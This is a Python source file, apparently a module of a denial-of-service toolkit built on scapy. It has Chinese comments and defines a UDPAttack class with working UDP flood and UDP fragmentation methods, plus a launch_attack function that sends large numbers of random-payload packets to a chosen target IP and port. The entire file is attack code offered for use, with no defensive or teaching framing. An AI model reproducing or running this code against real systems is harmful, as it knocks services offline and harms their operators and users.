from scapy.all import *
from ..common.utils import validate_ip, validate_port, setup_logging
import logging
import random

class UDPAttack:
    def __init__(self, target_ip: str, target_port: int):
        """初始化 UDP 攻击"""
        if not validate_ip(target_ip):
            raise ValueError("Invalid IP address")
        if not validate_port(target_port):
            raise ValueError("Invalid port number")
            
        self.target_ip = target_ip
        self.target_port = target_port
        setup_logging()
        self.logger = logging.getLogger(__name__)
        
    def launch_flood(self, count: int = 1000, payload_size: int = 1024):
        """发起 UDP 洪水攻击
        
        Args:
            count: 发送包的数量
            payload_size: 负载大小（字节）
        """
        self.logger.info(f"Starting UDP flood attack against {self.target_ip}:{self.target_port}")
        
        # 生成随机负载
        payload = bytes([random.randint(0, 255) for _ in range(payload_size)])
        
        for i in range(count):
            src_port = RandShort()
            
            # 构造 UDP 包
            udp_packet = IP(dst=self.target_ip)/UDP(
                sport=src_port,
                dport=self.target_port
            )/Raw(load=payload)
            
            try:
                send(udp_packet, verbose=False)
                if i % 100 == 0:
                    self.logger.info(f"Sent {i} UDP packets")
            except Exception as e:
                self.logger.error(f"Error sending packet: {e}")
                
        self.logger.info("UDP flood attack completed")
        
    def launch_fragmentation(self, count: int = 100, fragment_size: int = 1024):
        """发起 UDP 分片攻击
        
        Args:
            count: 发送包的数量
            fragment_size: 每个分片的大小（字节）
        """
        self.logger.info(f"Starting UDP fragmentation attack against {self.target_ip}:{self.target_port}")
        
        for i in range(count):
            src_port = RandShort()
            payload = bytes([random.randint(0, 255) for _ in range(fragment_size * 3)])  # 大包
            
            # 构造大的 UDP 包，让它自动分片
            udp_packet = IP(dst=self.target_ip)/UDP(
                sport=src_port,
                dport=self.target_port
            )/Raw(load=payload)
            
            try:
                send(udp_packet, verbose=False)
                if i % 10 == 0:
                    self.logger.info(f"Sent {i} fragmented UDP packets")
            except Exception as e:
                self.logger.error(f"Error sending packet: {e}")
                
        self.logger.info("UDP fragmentation attack completed")

def launch_attack(target_ip: str, target_port: int, attack_type: str = "flood", 
                 count: int = 1000, size: int = 1024):
    """启动 UDP 攻击
    
    Args:
        target_ip: 目标 IP 地址
        target_port: 目标端口
        attack_type: 攻击类型 ("flood" 或 "frag")
        count: 发送包的数量
        size: 包大小或分片大小
    """
    attacker = UDPAttack(target_ip, target_port)
    
    if attack_type.lower() == "flood":
        attacker.launch_flood(count, size)
    elif attack_type.lower() == "frag":
        attacker.launch_fragmentation(count, size)
    else:
        raise ValueError("Invalid attack type. Use 'flood' or 'frag'")